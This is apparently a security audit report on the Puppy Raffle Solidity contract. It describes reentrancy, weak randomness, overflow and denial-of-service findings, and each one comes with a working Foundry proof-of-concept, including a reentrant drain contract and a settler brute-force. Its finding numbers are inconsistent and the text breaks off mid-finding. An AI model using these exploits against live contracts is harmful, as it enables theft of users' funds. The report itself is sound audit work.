# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**Puppy Raffle Protocol**

Puppy Raffle is a simple ERC-721 powered raffle where each ticket buys a chance to win an on-chain “puppy” NFT and 80 % of the ETH pot.

**Workflow**  
1. **Deployment:** owner sets immutable `entranceFee`, `feeAddress`, and raffle `duration` (e.g. 1 ETH, treasury wallet, 1 day).  
2. **Buy tickets:** anyone calls `enterRaffle(address[] players)` sending `entranceFee × players.length`. Each address can appear only once per round; duplicates or under-payment revert. Players are appended to an array and flagged active.  
3. **Refund:** before a winner is drawn, any player may call `refund(index)` to delete their slot and reclaim their fee.  
4. **Select winner:** once `block.timestamp ≥ raffleStart + duration` **and** ≥ 4 active players, anyone may call `selectWinner()`. A pseudo-random index from `blockhash` chooses the victor. Contract transfers 80 % of the pot to that address and mints a rarity-weighted Puppy NFT (metadata & image fully on-chain). Remaining 20 % is recorded as protocol fees, players array is cleared, and timer restarts.  
5. **Fee withdrawal:** when no players are active, `withdrawFees()` sends the accumulated 20 % cut to `feeAddress`.

The sole owner privilege is updating `feeAddress`; no upgrade or admin minting paths exist.##Findings by Pattern


 **Derived From** : totalFees == 0 && address(this).balance == 0

[H-1]. Permanent fee-withdrawal DoS: forced ETH breaks withdrawFees balance invariant and bricks protocol fees

?

 **Derived From** : uint64 totalFees truncates/overflows in wei; withdrawFees equality check bricks funds

[H-2]. uint64 fee overflow + brittle balance==totalFees in PuppyRaffle.withdrawFees perma-locks fees; 1 wei force-send bricks withdrawals

?

 **Derived From** : Using players.length (incl. refunded zeros) breaks pot accounting and can DOS settlement

[M-3]. selectWinner misuses players.length incl. refunded zeros causing pot misaccounting and permanent settlement DoS

?

 **Derived From** : Rounding dust from 80/20 split can brick withdrawFees and strand ETH

[H-4]. DoS: rounding dust in PuppyRaffle.selectWinner leaves extra ETH so withdrawFees() always reverts

?

 **Derived From** : Refund reentrancy allows repeated payouts of entranceFee to the same player

[H-5]. Reentrancy in PuppyRaffle.refund lets malicious player drain pot via repeated entranceFee payouts before state is cleared

?

 **Derived From** : Winner payout uses untrusted call; reverting fallback can grief settlement

[M-6]. Malicious winner can revert payout causing DoS in PuppyRaffle.selectWinner and stalling settlement

?

 **Derived From** : Predictable RNG lets callers influence winner and rarity

[H-7]. Predictable RNG in PuppyRaffle.selectWinner lets caller choose winning index and skew NFT rarity

?

 **Derived From** : Quadratic duplicate-check DoS in enterRaffle causes gas exhaustion

[M-8]. DOS via unbounded quadratic duplicate scan in PuppyRaffle.enterRaffle blocks new entries

?
### Number of Findings
- C: 0
- H: 5
- M: 3
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Quadratic duplicate-check DoS in enterRaffle causes gas exhaustion

## [M-2]. DOS via unbounded quadratic duplicate scan in PuppyRaffle.enterRaffle blocks new entries

## Derived From Pattern/Invariant
Quadratic duplicate-check DoS in enterRaffle causes gas exhaustion

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Minimim Privilege Required
Permissionless

## Description
enterRaffle() appends new players, then performs an O(n^2) nested scan across the entire players[] to detect duplicates. As players[] grows, this quadratic loop can exceed the per-call/block gas limit, causing out-of-gas reverts and preventing anyone from entering until the round is settled. An attacker can cheaply bloat players[] (e.g., 1 wei fee) to grief liveness.
Vulnerable snippet:
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}

## Impact
Functional liveness DoS: future entries revert due to gas exhaustion until the raffle is settled (players cleared). This halts pot growth, blocks fair participation, and delays fee accrual/operations dependent on new entries.

## Proof of Concept
1) Attacker deploys/targets a round with a low entranceFee (or tolerable cost).
2) Repeatedly calls enterRaffle with unique addresses to grow players[]. Each call executes the O(n^2) duplicate scan over the entire array.
3) Once players[] is large enough, even honest users calling enterRaffle with a reasonable gas stipend will revert out-of-gas due to the quadratic loop.
4) Until selectWinner() clears players[], no one can enter, creating a liveness DoS for the round.

## Proof of Code
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract DuplicateScanDoSTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 wei;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xFEE), 1 days);
    }

    function _enter(address p) internal {
        address[] memory arr = new address[](1);
        arr[0] = p;
        raffle.enterRaffle{value: FEE}(arr);
    }

    function test_duplicateScanGasDoS() public {
        uint256 gasLimit = 200_000;

        // Populate with 50 players – still fits in the gas limit
        for (uint160 i = 1; i <= 50; i++) {
            _enter(address(i));
        }

        // Sanity-check: limited-gas entry still succeeds
        {
            address[] memory arr = new address[](1);
            arr[0] = address(0xBEEF);
            (bool ok, ) = address(raffle).call{value: FEE, gas: gasLimit}(
                abi.encodeWithSelector(raffle.enterRaffle.selector, arr)
            );
            assertTrue(ok);
        }

        // Grow players[] to 600 entries – quadratic scan will overflow gasLimit
        for (uint160 i = 51; i <= 600; i++) {
            _enter(address(i));
        }

        // Expect the same limited-gas call to fail
        {
            address[] memory arr2 = new address[](1);
            arr2[0] = address(0xCAFE);
            (bool ok2, ) = address(raffle).call{value: FEE, gas: gasLimit}(
                abi.encodeWithSelector(raffle.enterRaffle.selector, arr2)
            );
            assertFalse(ok2, "call should run out of gas and revert");
        }
    }

    receive() external payable {}
}

## Suggested Mitigation
- Eliminate the quadratic global scan. Track participation in O(1):
  1) Introduce a roundId and mapping(address => uint256) lastEnteredRound.
  2) On enterRaffle, for each p in newPlayers: require(lastEnteredRound[p] != roundId), then set lastEnteredRound[p] = roundId and push p. Optionally check duplicates within the provided batch only (O(m^2) over newPlayers, where m is typically small), or maintain a memory set via a bitmap/HashSet pattern.
  3) On selectWinner, increment roundId (no need to clear the mapping), and delete players.
Example:
    uint256 public roundId;
    mapping(address => uint256) public lastEnteredRound;
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "Must send enough");
        for (uint256 i; i < newPlayers.length; ++i) {
            address p = newPlayers[i];
            require(lastEnteredRound[p] != roundId, "Duplicate player");
            lastEnteredRound[p] = roundId;
            players.push(p);
        }
        emit RaffleEnter(newPlayers);
    }
    function selectWinner() external { /* ... */ delete players; roundId++; /* ... */ }
This changes complexity from O(N^2) to O(N + m), preventing gas-based DoS.




 **Derived From** : Rounding dust from 80/20 split can brick withdrawFees and strand ETH

## [H-3]. DoS: rounding dust in PuppyRaffle.selectWinner leaves extra ETH so withdrawFees() always reverts

## Derived From Pattern/Invariant
Rounding dust from 80/20 split can brick withdrawFees and strand ETH

## Exploit Type
RoundingError

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner() computes both prize and fee with floor division, then only sends out the prize. When totalAmountCollected is not divisible by 5, floor rounding leaves 1 wei dust each round in the contract balance that is not added to totalFees. withdrawFees() gates on exact equality between balance and totalFees, so the extra dust causes a permanent revert even when no players are active. Vulnerable snippets:

uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee      = (totalAmountCollected * 20) / 100;
...
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

## Impact
Permanent DoS of fee withdrawals; accumulated protocol fees become stuck as dust accrues (balance > totalFees), requiring redeploy to recover.

## Proof of Concept
1) Deploy PuppyRaffle with an entranceFee not divisible by 5 (e.g., 3 wei) so totalAmountCollected is typically not a multiple of 5.
2) Four unique addresses enter by calling enterRaffle with msg.value = entranceFee * 4.
3) After raffleDuration elapses, call selectWinner(). With totalAmountCollected=12 wei, prizePool=floor(9.6)=9 wei, fee=floor(2.4)=2 wei; 1 wei dust remains in the contract.
4) totalFees=2, but address(this).balance=3, so withdrawFees() reverts due to strict equality check.
5) Subsequent rounds can only keep dust ≥ 1 (never decreases), permanently bricking fee withdrawals.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PrecisionDriftAccumulationTest is Test {
    function test_RoundingDustLocksFees() public {
        // entranceFee not divisible by 5 to force dust
        address feeAddress = address(0xBEEF);
        PuppyRaffle raffle = new PuppyRaffle(3, feeAddress, 1);

        // prepare 4 unique players
        address[] memory addrs = new address[](4);
        addrs[0] = address(0x1);
        addrs[1] = address(0x2);
        addrs[2] = address(0x3);
        addrs[3] = address(0x4);

        // fund and enter raffle with exact payment: 3 wei * 4 = 12 wei
        vm.deal(address(this), 12);
        raffle.enterRaffle{value: 12}(addrs);

        // settle raffle
        vm.warp(block.timestamp + 2);
        vm.prank(address(0xA11CE));
        raffle.selectWinner();

        // With total=12, prize=9, fee=2, dust=1 -> balance = 3, totalFees = 2
        assertEq(address(raffle).balance, uint256(raffle.totalFees()) + 1);

        // withdrawFees requires exact equality and will revert
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Compute only one side with division and derive the other by subtraction so prize + fee == totalAmountCollected, avoiding dust. For example:

    uint256 fee = totalAmountCollected / 5; // floor 20%
    uint256 prizePool = totalAmountCollected - fee; // remaining 80% (ceil)
    totalFees += uint64(fee);

- Alternatively, keep current prize calculation and set fee = totalAmountCollected - prizePool (ceil 20%), then accrue that value.
- Also relax/replace the withdraw guard to check no active players instead of exact balance equality, e.g., require(players.length == 0, "players active");




 **Derived From** : Predictable RNG lets callers influence winner and rarity

## [H-4]. Predictable RNG in PuppyRaffle.selectWinner lets caller choose winning index and skew NFT rarity

## Derived From Pattern/Invariant
Predictable RNG lets callers influence winner and rarity

## Exploit Type
Randomness

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner derives both winner and rarity from keccak256 of easily-influenced inputs, notably msg.sender and miner-tweakable fields, without commit–reveal/VRF. A caller can choose which EOA settles the round and time the call to bias the outcome: winnerIndex from keccak256(msg.sender, block.timestamp, block.difficulty) % players.length, and rarity from keccak256(msg.sender, block.difficulty) % 100. Vulnerable snippets:

uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
...
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;

## Impact
By controlling the address that calls selectWinner() and repeatedly attempting settlement across blocks, an attacker that owns only a single ticket can wait until the on-chain entropy resolves in their favour (or brute-force a suitable msg.sender) and deterministically win the round. As a result the attacker steals 80 % of the ETH pot that rightfully belongs to the other participants and also receives an arbitrarily high-rarity NFT, breaking both economic and distribution fairness.

## Proof of Concept
1) Attacker enters the raffle with one address (one ticket) among ≥4 players.
2) After raffle end, attacker prepares many EOAs and evaluates, off-chain, keccak256(EOA, ts, diff) % N for the current block timestamp/difficulty to target the index of their ticket; also checks keccak256(EOA, diff) % 100 for high rarity.
3) They call selectWinner() from the EOA that yields their ticket index and desired rarity. The contract transfers 80% of the pot to attacker’s ticket and mints a rarer NFT.
4) No commit–reveal/VRF prevents this bias; msg.sender is entirely attacker-controlled and miner/validator can further skew timestamp/prevrandao.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RNGManipulationTest is Test {
    PuppyRaffle raffle;
    address feeWallet = address(0xFEE);
    uint256 constant DURATION = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeWallet, DURATION);
    }

    function test_RNG_Manipulation_SelectsAttackerAndForcesLegendary() public {
        // Set up 4 unique players where the attacker ticket is at index 3
        address p1 = vm.addr(101);
        address p2 = vm.addr(102);
        address p3 = vm.addr(103);
        address attackerTicket = vm.addr(104);

        // Fund a sponsor to pay the entry fees
        address sponsor = vm.addr(1000);
        vm.deal(sponsor, 10 ether);

        address[] memory players = new address[](4);
        players[0] = p1;
        players[1] = p2;
        players[2] = p3;
        players[3] = attackerTicket; // attacker holds index 3

        uint256 fee = raffle.entranceFee();
        vm.prank(sponsor);
        raffle.enterRaffle{value: fee * players.length}(players);

        // Advance time to end of raffle and fix block params
        vm.warp(block.timestamp + DURATION + 1);
        vm.roll(block.number + 1);
        vm.difficulty(0xBEEF);

        uint256 ts = block.timestamp;
        uint256 diff = block.difficulty;

        // Search for a settlement EOA such that:
        // winnerIndex == 3 (attackerTicket) and rarity > 95 (legendary path)
        address settler;
        uint256 settlerPk;
        for (uint256 pk = 1; pk < 200000; pk++) {
            address s = vm.addr(pk);
            uint256 idx = uint256(keccak256(abi.encodePacked(s, ts, diff))) % players.length;
            if (idx == 3) {
                uint256 rare = uint256(keccak256(abi.encodePacked(s, diff))) % 100;
                if (rare > 95) { // legendary branch: >95 yields 96..99
                    settler = s;
                    settlerPk = pk;
                    break;
                }
            }
        }
        require(settler != address(0), "no suitable settler found in search range");

        // Fund settler EOA minimally
        vm.deal(settler, 0.1 ether);

        // Pre-state balances
        uint256 attackerBalBefore = attackerTicket.balance;

        // Call selectWinner from the chosen EOA to bias winner & rarity
        vm.prank(settler);
        raffle.selectWinner();

        // Verify winner and payout redirected to attackerTicket (index 3)
        assertEq(raffle.previousWinner(), attackerTicket, "attacker ticket should be winner");
        assertEq(raffle.ownerOf(0), attackerTicket, "minted NFT owner should be attacker ticket");

        // Verify payout amount = 80% of pot (4 * 1 ether * 80%)
        uint256 expectedPrize = (4 * fee * 80) / 100; // 3.2 ether
        assertEq(attackerTicket.balance - attackerBalBefore, expectedPrize, "incorrect prize payout");

        // Verify rarity forced into legendary bracket
        // tokenId = 0 for first mint (totalSupply() was 0 before mint)
        assertEq(raffle.tokenIdToRarity(0), raffle.LEGENDARY_RARITY(), "rarity should be legendary");
    }
}


## Suggested Mitigation
- Do not derive randomness from msg.sender, block.timestamp, block.difficulty/prevrandao.
- Use a secure source such as Chainlink VRF v2; use the VRF output to derive both winner index and rarity (e.g., expand a single VRF value into multiple random words).
- Alternatively, implement a commit–reveal scheme with settlement delayed across blocks (use a future blockhash) and exclude msg.sender from the entropy.
- Validate rarity using the same secure randomness and avoid a second weak RNG.




 **Derived From** : uint64 totalFees truncates/overflows in wei; withdrawFees equality check bricks funds

## [H-5]. uint64 fee overflow + brittle balance==totalFees in PuppyRaffle.withdrawFees perma-locks fees; 1 wei force-send bricks withdrawals

## Derived From Pattern/Invariant
uint64 totalFees truncates/overflows in wei; withdrawFees equality check bricks funds

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Minimim Privilege Required
Permissionless

## Description
totalFees is a uint64 that tracks wei. In selectWinner the fee (uint256) is cast to uint64 and added with unchecked 0.7.x arithmetic, so large fees truncate/overflow. This breaks the accounting invariant balance == totalFees that withdrawFees strictly enforces, permanently blocking withdrawals while the full ETH remains in the contract. Additionally, anyone can force-send 1 wei via selfdestruct to make balance = totalFees + 1 forever, bricking withdrawFees even without overflow.
Vulnerable snippets:
uint64 public totalFees;
...
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee); // truncation & overflow in wei
...
require(address(this).balance == uint256(totalFees), 'PuppyRaffle: There are currently players active!'); // brittle equality

## Impact
Permanent DoS of fee withdrawals. Treasury fees become unwithdrawable: (a) when a single large round makes fee > 2^64-1 wei, totalFees stores a truncated value while contract holds full fee; (b) any EOA can force-send 1 wei to desynchronize balance vs totalFees. Funds are stuck unless contract is upgraded or forcibly migrated.

## Proof of Concept
Case A (uint64 overflow/truncation):
1) Deploy PuppyRaffle with entranceFee = 30 ether, feeAddress = treasury.
2) 4 players enter in one tx sending 120 ether total.
3) After duration, call selectWinner(). Prize=96 ETH sent to winner; fee=24 ETH left in contract.
4) fee (24e18) is cast to uint64 and truncated since 24e18 > 2^64-1 wei, so totalFees != 24e18.
5) Call withdrawFees(); strict equality require(address(this).balance == totalFees) fails; fees are stuck.

Case B (force-send 1 wei):
1) Deploy PuppyRaffle with entranceFee = 1 ether.
2) 4 players enter with 4 ether; after duration call selectWinner(). Contract holds 0.8 ether and totalFees == 0.8 ether.
3) Attacker selfdestructs a helper contract to force-send 1 wei to PuppyRaffle.
4) Now address(this).balance = totalFees + 1; withdrawFees reverts forever due to brittle equality check.

## Proof of Code
// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport "forge-std/Test.sol";\nimport {PuppyRaffle} from "src/PuppyRaffle.sol";\n\ncontract ForceSend {\n    constructor() payable {}\n    function boom(address payable target) external {\n        selfdestruct(target);\n    }\n}\n\ncontract PuppyRaffle_AccountingInvariantViolation_Test is Test {\n    function _enter4(PuppyRaffle raffle, uint256 entranceFee) internal {\n        address[] memory addrs = new address[](4);\n        addrs[0] = address(0xA1);\n        addrs[1] = address(0xB2);\n        addrs[2] = address(0xC3);\n        addrs[3] = address(0xD4);\n        vm.deal(address(this), entranceFee * 4);\n        raffle.enterRaffle{value: entranceFee * 4}(addrs);\n    }\n\n    function test_uint64Overflow_truncatesFees_and_bricksWithdraw() public {\n        // entranceFee = 30 ETH -> 4 players -> pot=120 ETH, fee=24 ETH > 2^64-1 wei\n        PuppyRaffle raffle = new PuppyRaffle(30 ether, address(0xFEE), 1 days);\n        _enter4(raffle, 30 ether);\n        vm.warp(block.timestamp + 1 days + 1);\n        raffle.selectWinner();\n\n        uint256 expectedFee = (4 * 30 ether) * 20 / 100; // 24 ETH\n        assertEq(address(raffle).balance, expectedFee);\n\n        uint256 storedFees = uint256(raffle.totalFees());\n        assertTrue(storedFees != expectedFee); // truncated down to uint64\n\n        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));\n        raffle.withdrawFees();\n    }\n\n    function test_forceSendOneWei_permaBricks_withdrawFees() public {\n        PuppyRaffle raffle = new PuppyRaffle(1 ether, address(0xFEE), 1 days);\n        _enter4(raffle, 1 ether);\n        vm.warp(block.timestamp + 1 days + 1);\n        raffle.selectWinner();\n\n        uint256 expectedFee = (4 * 1 ether) * 20 / 100; // 0.8 ETH\n        assertEq(address(raffle).balance, expectedFee);\n        assertEq(uint256(raffle.totalFees()), expectedFee);\n\n        // Attacker force-sends 1 wei\n        ForceSend fs = new ForceSend();\n        vm.deal(address(fs), 1);\n        fs.boom(payable(address(raffle)));\n\n        assertEq(address(raffle).balance, expectedFee + 1);\n        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));\n        raffle.withdrawFees();\n    }\n}

## Suggested Mitigation
Use uint256 for fee accounting and avoid brittle equality: (1) Change `uint64 public totalFees` to `uint256 public totalFees` and update `selectWinner` to `totalFees += fee;` (no downcast). Compile with Solidity >=0.8 for checked arithmetic or use SafeMath in 0.7.x. (2) In `withdrawFees`, replace `require(address(this).balance == uint256(totalFees))` with a robust condition, e.g., `require(players.length == 0, "PuppyRaffle: Players active"); require(address(this).balance >= totalFees, "insufficient balance");` Then withdraw exactly `totalFees`. This tolerates forced ETH. Optionally add an owner-only `sweep(address,uint256)` to handle stray ETH if desired.




 **Derived From** : totalFees == 0 && address(this).balance == 0

## [H-6]. Permanent fee-withdrawal DoS: forced ETH breaks withdrawFees balance invariant and bricks protocol fees

## Derived From Pattern/Invariant
totalFees == 0 && address(this).balance == 0

## Exploit Type
UnexpectedEth

## Location
PuppyRaffle.withdrawFees

## Minimim Privilege Required
Permissionless

## Description
withdrawFees relies on address(this).balance == totalFees to guarantee 'no active pot'. Any user can force-send ETH (selfdestruct), making balance > totalFees, causing perpetual revert and locking fees. Vulnerable snippet:

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

Since selfdestruct cannot be prevented, any unexpected ETH breaks the balance invariant, blocking withdrawals forever.

## Impact
Permanent DoS of fee withdrawals; accumulated protocol fees become stuck in the contract (economic loss to feeAddress/treasury).

## Proof of Concept
- Seed a round with ≥4 players; call selectWinner to accrue 20% fee in contract.
- Attacker deploys a ForceSend contract funded with 1 wei and selfdestructs to PuppyRaffle.
- Now address(this).balance > totalFees by 1 wei.
- Any call to withdrawFees reverts due to strict equality check, permanently bricking fee withdrawal.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ForceSend { constructor() payable {} function boom(address payable target) external { selfdestruct(target); } }

contract UnexpectedEthDoSTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, address(0xFEE), 1 days);
    }

    function _seedRound() internal {
        address[] memory ps = new address[](4);
        ps[0] = address(1); ps[1] = address(2); ps[2] = address(3); ps[3] = address(4);
        vm.deal(address(this), 100 ether);
        raffle.enterRaffle{value: 4 * ENTRANCE}(ps);
        vm.warp(block.timestamp + 1 days + 1);
        vm.roll(block.number + 1);
        raffle.selectWinner();
    }

    function test_UnexpectedEth_BricksWithdrawFees() public {
        _seedRound();
        assertEq(address(raffle).balance, uint256(raffle.totalFees()));
        // Attacker force-sends 1 wei
        ForceSend fs = new ForceSend{value: 1}();
        fs.boom(payable(address(raffle)));
        assertEq(address(raffle).balance, uint256(raffle.totalFees()) + 1);
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Do not use address(this).balance as a proxy for pot/fee state. Track fee/pot with dedicated accounting variables and only assert balance >= totalFees.
- Change check to require(address(this).balance >= totalFees) to allow withdrawing owed fees even with dust.
- Optionally add receive() to revert on direct ETH transfers (cannot block selfdestruct) and include a rescue/sweep for unexpected ETH if no players are active.




 **Derived From** : Refund reentrancy allows repeated payouts of entranceFee to the same player

## [H-7]. Reentrancy in PuppyRaffle.refund lets malicious player drain pot via repeated entranceFee payouts before state is cleared

## Derived From Pattern/Invariant
Refund reentrancy allows repeated payouts of entranceFee to the same player

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Minimim Privilege Required
Permissionless

## Description
refund transfers ETH to msg.sender before clearing their slot, violating checks-effects-interactions. A malicious contract in players[] can reenter refund(playerIndex) from its receive/fallback while players[playerIndex] still equals msg.sender, pulling entranceFee repeatedly in a single tx until contract balance depletes.
Vulnerable snippet:
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, '...');
    require(playerAddress != address(0), '...');
    payable(msg.sender).sendValue(entranceFee); // external call before state change
    players[playerIndex] = address(0);          // state cleared after
}

## Impact
Attacker drains ETH pot (all participants’ deposits and pending fees) by multi-claiming entranceFee from the same index in one transaction, breaking the round and stealing funds.

## Proof of Concept
1) Attacker deploys a malicious contract with a reentrant receive().
2) Enter raffle with participants [A,B,C,AttackerContract], paying entranceFee*4.
3) Determine AttackerContract index (e.g., 3) from deterministic push order.
4) Call refund(3) from AttackerContract. On first sendValue, receive() reenters refund(3) multiple times while players[3] still equals attacker.
5) Each reentry pays entranceFee again, draining the contract balance. After recursion unwinds, slot gets zeroed once, but funds are already stolen.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundReentrancyAttack {
    PuppyRaffle public raffle;
    uint256 public idx;
    uint256 public max;
    uint256 public count;
    address public owner;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
        owner = msg.sender;
    }

    function setIndex(uint256 _i) external {
        require(msg.sender == owner, "only owner");
        idx = _i;
    }

    function attack(uint256 _max) external {
        require(msg.sender == owner, "only owner");
        max = _max;
        count = 0;
        raffle.refund(idx);
    }

    receive() external payable {
        if (count < max) {
            count++;
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    RefundReentrancyAttack attacker;

    uint256 constant TICKET = 1 ether;
    address fee = address(0xFEE);

    function setUp() public {
        vm.deal(address(this), 100 ether);
        raffle = new PuppyRaffle(TICKET, fee, 1 days);
        attacker = new RefundReentrancyAttack(raffle);

        address[] memory newPlayers = new address[](4);
        newPlayers[0] = address(0xA1);
        newPlayers[1] = address(0xA2);
        newPlayers[2] = address(0xA3);
        newPlayers[3] = address(attacker);

        raffle.enterRaffle{value: TICKET * 4}(newPlayers);
    }

    function testRefundReentrancyDrainsPot() public {
        // Attacker is last pushed => index 3
        attacker.setIndex(3);

        uint256 attackerPrev = address(attacker).balance;
        uint256 rafflePrev = address(raffle).balance;
        assertEq(rafflePrev, TICKET * 4);

        // 3 reentries + 1 top-level send = 4 refunds of entranceFee
        attacker.attack(3);

        assertEq(address(raffle).balance, 0, "raffle drained");
        assertEq(address(attacker).balance - attackerPrev, TICKET * 4, "attacker multi-refunded");
        assertEq(raffle.players(3), address(0), "slot cleared after drain");
    }
}


## Suggested Mitigation
Apply checks-effects-interactions and/or a reentrancy guard: clear state before external call and guard the function. Example (Solc 0.7.x):
- inherit ReentrancyGuard and add nonReentrant to refund.
- reorder operations:
  function refund(uint256 playerIndex) public nonReentrant {
      address player = players[playerIndex];
      require(player == msg.sender, "Only the player");
      require(player != address(0), "Not active");
      players[playerIndex] = address(0); // effects first
      (bool ok,) = msg.sender.call{value: entranceFee}("");
      require(ok, "Refund failed");
  }
Alternatively adopt a withdrawal pattern where users pull refunds from recorded credits.




 **Derived From** : Using players.length (incl. refunded zeros) breaks pot accounting and can DOS settlement

## [M-8]. selectWinner misuses players.length incl. refunded zeros causing pot misaccounting and permanent settlement DoS

## Derived From Pattern/Invariant
Using players.length (incl. refunded zeros) breaks pot accounting and can DOS settlement

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
Refund sets players[playerIndex] = address(0) but does not remove the slot. selectWinner then treats players.length as the active count for precondition, pot, fee, and winner selection. This violates the invariant pot == activePlayers * entranceFee and allows winner == address(0), causing reverts.
Vulnerable snippet:
// refund leaves holes
players[playerIndex] = address(0);

// settlement uses total length, not active count
require(players.length >= 4, 'PuppyRaffle: Need at least 4 players');
uint256 totalAmountCollected = players.length * entranceFee; // includes refunded
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
address winner = players[winnerIndex]; // can be address(0)

## Impact
Attacker can permanently DoS settlement. With ≥1 refunded slot, prizePool > contract balance and winner payout fails, reverting selectWinner. Alternatively, winner may be address(0) and _safeMint reverts. Protocol cannot progress; fees remain locked until a new deployment or code fix; users must refund to recover deposits.

## Proof of Concept
1) Attacker funds four addresses A1..A4 and enters them in one call paying 4 * entranceFee.
2) Attacker refunds one slot (e.g., A3). players now contains a zero hole; contract balance = 3 * entranceFee, but players.length == 4.
3) After raffle duration elapses, anyone calls selectWinner().
4) totalAmountCollected = players.length * entranceFee = 4 * fee; prizePool = 3.2 * fee while contract holds only 3 * fee. The value transfer fails and selectWinner reverts with 'PuppyRaffle: Failed to send prize pool to winner'.
5) Because the function reverts, players[] is not cleared; the raffle remains stuck. Any further attempts will keep reverting. Even if balance matches, if RNG picks a zero slot, _safeMint to address(0) reverts, keeping settlement bricked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract PuppyRaffleAccountingInvariantTest is Test {
    PuppyRaffle raffle;
    address feeAddr = address(0xFEE);
    uint256 entranceFee = 1 ether;

    address alice = address(0xA11CE);
    address a1 = address(0xA1);
    address a2 = address(0xA2);
    address a3 = address(0xA3);
    address a4 = address(0xA4);

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddr, 1 days);
        // fund participants and the caller who pays for entries
        vm.deal(alice, 100 ether);
        vm.deal(a1, 100 ether);
        vm.deal(a2, 100 ether);
        vm.deal(a3, 100 ether);
        vm.deal(a4, 100 ether);

        address[] memory players = new address[](4);
        players[0] = a1; players[1] = a2; players[2] = a3; players[3] = a4;
        vm.prank(alice);
        raffle.enterRaffle{value: entranceFee * 4}(players);

        // a3 refunds to create a zero hole in the array
        vm.prank(a3);
        raffle.refund(2);

        // after refund, contract holds only 3 * entranceFee
        assertEq(address(raffle).balance, entranceFee * 3);

        // fast-forward beyond raffle duration
        vm.warp(block.timestamp + 1 days + 1);
    }

    function test_DoS_selectWinner_dueToPotMisaccounting() public {
        // With one refunded slot, selectWinner computes prizePool from players.length (4),
        // i.e., prizePool = 3.2 ETH, but contract balance is only 3 ETH -> transfer fails
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();

        // Raffle remains stuck (state not cleared), repeatable DoS
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }
}


## Suggested Mitigation
- Maintain a compact active players set. Use swap-and-pop on refund to remove holes:
  players[playerIndex] = players[players.length - 1];
  players.pop();
- Alternatively, keep an activeCount and compute the pot from actual funds: uint256 roundBalance = address(this).balance - uint256(totalFees); prizePool = (roundBalance * 80) / 100; fee = roundBalance - prizePool; This preserves the accounting invariant even with refunds.
- Ensure winner != address(0): if using holes, resample or iterate to the next non-zero slot, or better, eliminate holes as above.




 **Derived From** : Winner payout uses untrusted call; reverting fallback can grief settlement

## [M-9]. Malicious winner can revert payout causing DoS in PuppyRaffle.selectWinner and stalling settlement

## Derived From Pattern/Invariant
Winner payout uses untrusted call; reverting fallback can grief settlement

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
